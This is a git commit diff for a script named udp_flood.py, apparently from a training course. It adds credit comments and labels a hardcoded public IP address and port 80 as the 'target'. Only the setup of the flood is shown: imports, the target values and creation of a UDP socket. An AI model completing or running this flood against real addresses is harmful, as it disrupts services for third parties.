52b5fe5048a7408f6015a55208cb197cbf56a03e
Guilherme Junqueira <guilhermej@users.noreply.github.com>
2017-09-23 22:09:34 -0300

    Update udp_flood.py

--- udp_flood.py
+++ udp_flood.py
@@ -1,8 +1,12 @@
+# Solyd Treinamentos - Guilherme Junqueira
+# https://solyd.com.br/treinamentos
+
+
 import socket
 import random
 
-dest_ip = '31.13.85.36'
-dest_port = 80
+dest_ip = '31.13.85.36' # target ip
+dest_port = 80          # target port
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
